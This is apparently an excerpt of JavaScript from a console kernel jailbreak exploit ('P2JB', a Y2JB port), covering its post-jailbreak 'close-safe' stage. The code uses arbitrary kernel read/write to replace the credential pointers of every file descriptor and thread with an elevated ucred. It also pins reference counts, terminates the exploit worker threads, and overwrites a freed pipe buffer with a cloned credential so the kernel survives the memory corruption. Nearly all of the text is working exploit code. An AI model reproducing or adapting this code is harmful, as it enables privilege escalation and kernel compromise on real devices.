...
(async function () {
    try {
        const p2jb_version = "P2JB 2.2/T026 (Y2JB port v2 + post_jb close-safe)";
        ...
        function ensure_kernel_offset() {
            ...
            kernel_offset = {
                ...
                FILE_FCRED: 0x10n, FILE_FCOUNT: 0x28n,
        ...
        function read_credlike_score(S, p) {
            try {
                if (!is_kptr(p)) return 0;
                let score = 0;
                const ref = S.kread32(p);
                const uid = S.kread32(p + S.OFF.UCRED_CR_UID);
                const ruid = S.kread32(p + S.OFF.UCRED_CR_RUID);
                const svuid = S.kread32(p + S.OFF.UCRED_CR_SVUID);
                const ng = S.kread32(p + S.OFF.UCRED_CR_NGROUPS);
                if (ref > 0n && ref < 0x2000000n) score++;
                if (uid < 0x10000n) score++;
                if (ruid < 0x10000n) score++;
                if (svuid < 0x10000n) score++;
                if (ng <= 64n) score++;
                return score;
            } catch (_) { return 0; }
        }

        function detect_td_ucred_off(S) {
            const B = S.proc_ucred;
            const main_thread = S.kread64(S.curproc + 0x10n);
            if (!is_kptr(main_thread)) return 0x140n;
            const next_thread = S.kread64(main_thread + 0x10n);
            let best = 0n, best_score = -1;
            for (let off = 0x100n; off <= 0x200n; off += 8n) {
                const v0 = S.kread64(main_thread + off);
                const v1 = is_kptr(next_thread) ? S.kread64(next_thread + off) : 0n;
                let score = 0;
                if (v0 === B) score += 10;
                if (v1 === B) score += 10;
                score += read_credlike_score(S, v0);
                score += read_credlike_score(S, v1);
                if (score > best_score) { best_score = score; best = off; }
            }
            if (best === 0n || best_score < 5) return 0x140n;
            return best;
        }

        async function post_jb_migrate_fd_creds(S) {
            const B = S.proc_ucred;
            const seen = [];
            let migrated = 0;
            let distinct = 0;
            const max_fd = Math.max(256, S.master_wfd + 32, S.victim_wfd + 32);
            for (let fd = 0; fd < max_fd; fd++) {
                try {
                    const ent = S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE;
                    const fp = S.kread64(ent);
                    if (!is_kptr(fp)) continue;
                    const caddr = fp + S.OFF.FILE_FCRED;
                    const c = S.kread64(caddr);
                    if (!is_kptr(c) || c === B) continue;
                    // f_cred is expected at fp+0x10 because fp+0x28 is f_count in this port.
                    // Replace only values that are kptrs; do not touch f_data/f_ops.
                    S.kwrite64(caddr, B);
                    migrated++;
                    if (!seen.some(x => x === c)) { seen.push(c); distinct++; }
                } catch (_) { }
            }
            await ulog("post_jb: migrate " + migrated + " fds' f_cred -> B (" +
                distinct + " distinct cred kptrs replaced)");
        }

        async function post_jb_migrate_thread_creds(S) {
            const B = S.proc_ucred;
            const off = detect_td_ucred_off(S);
            let td = S.kread64(S.curproc + 0x10n);
            const seen = [];
            let migrated = 0, walked = 0, distinct = 0;
            while (is_kptr(td) && walked < 500) {
                walked++;
                try {
                    if (S.kread64(td + 0x08n) !== S.curproc) break;
                    const c = S.kread64(td + off);
                    if (is_kptr(c) && c !== B) {
                        S.kwrite64(td + off, B);
                        migrated++;
                        if (!seen.some(x => x === c)) { seen.push(c); distinct++; }
            ...
            await ulog("post_jb: migrate " + migrated + " threads' td_ucred -> B (" +
                distinct + " distinct cred kptrs replaced, off=" + toHex(off) + ")");
        }

        async function post_jb_pin_B(S) {
            const B = S.proc_ucred;
            const old_ref = S.kread32(B);
            S.kwrite32(B, 0x100000);
            await ulog("post_jb: pin B cr_ref(B) " + toHex(old_ref) +
                " -> 0x100000");
        }

        async function post_jb_terminate_workers(S) {
            const groups = [
                { name: "iov", ws: S.iov_ws, workers: S.iov_workers || [] },
                { name: "uio_read", ws: S.uio_read_ws, workers: S.uio_read_workers || [] },
                { name: "uio_write", ws: S.uio_write_ws, workers: S.uio_write_workers || [] },
            ];
            let total_dead = 0;
            for (const g of groups) {
                try {
                    for (const ch of g.workers) {
                        if (ch && ch.pivotAddr && ch.exitAddr) write64(ch.pivotAddr, ch.exitAddr);
                    }
                    for (let i = 0; i < g.ws.n; i++) write64(g.ws.finished + BigInt(i * 8), 0n);
                    ...
                    while (Date.now() < dl) {
                        let done = 0;
                        for (let i = 0; i < g.ws.n; i++) {
                            if (read64(g.ws.finished + BigInt(i * 8)) === 0xD1E5n) done++;
                        }
                        if (done === g.ws.n) break;
                        await js_sleep(50);
                    }
                    let done = 0;
                    for (let i = 0; i < g.ws.n; i++) {
                    ...
                    total_dead += done;
                    await ulog("post_jb: " + g.name + " workers terminated " + done + "/" + g.ws.n + " (thr_exit)");
                    try { g.ws.close_pipes(); } catch (_) { }
                } catch (e) {
                    await ulog("post_jb: " + g.name + " worker termination warning: " + e.message);
                }
            }
            await ulog("post_jb: " + total_dead + " iov/uio workers terminated (thr_exit)");
        }

        async function post_jb_clone_B_over_A_and_pipe_safe(S) {
            const B = S.proc_ucred;
            const A = S.victim_pipe_data;
            if (!is_kptr(A) || !is_kptr(B)) {
                await ulog("post_jb: stale A/B invalid - B-clone skipped");
                return;
            }
            const clone = malloc(UCRED_SIZE);
            const r = S.kread(clone, B, UCRED_SIZE);
            if (r !== BigInt(UCRED_SIZE)) {
                await ulog("post_jb: B clone read returned " + toHex(r) +
                    " expected=" + toHex(BigInt(UCRED_SIZE)) + " - skipped");
                return;
            }
            const old_A_ref = S.kread32(A);
            write32(clone, 0x100000n);
            // Dual-purpose safety: when stale users see A as ucred, cr_ref is pinned;
            // when pipe free-path sees the reclaimed pipe-shaped area, buffer field at +0x10 is NULL.
            write64(clone + 0x10n, 0n);
            const w = S.kwrite(A, clone, UCRED_SIZE);
            await ulog("post_jb: pin A->" + toHex(A) +
                " overwritten with B-clone, cr_ref " + toHex(old_A_ref) +
                " -> 0x100000 (stale freelist consumers now see safe ucred)");
            await ulog("post_jb: master_pipe buffer NULL'd via B-clone +0x10 " +
                "(was " + toHex(A) + " = victim_pipe_data, kernel free-path should now skip vm_map_remove, kwrite=" +
                toHex(w) + ")");
        }

        async function post_jb_close_safe(S) {
            await ulog("post_jb: entered T026 complete post-JB close-safe sequence");
            try { await post_jb_migrate_fd_creds(S); }
            catch (e) { await ulog("post_jb: fd cred migrate warning: " + e.message); }
            try { await post_jb_migrate_thread_creds(S); }
            catch (e) { await ulog("post_jb: thread cred migrate warning: " + e.message); }
            try { await post_jb_pin_B(S); }
            catch (e) { await ulog("post_jb: pin B warning: " + e.message); }
            try { await post_jb_terminate_workers(S); }
            catch (e) { await ulog("post_jb: worker teardown warning: " + e.message); }
            try { await post_jb_clone_B_over_A_and_pipe_safe(S); }
            catch (e) { await ulog("post_jb: A/B clone warning: " + e.message); }
            await ulog("post_jb: T026 close-safe sequence complete");
        }
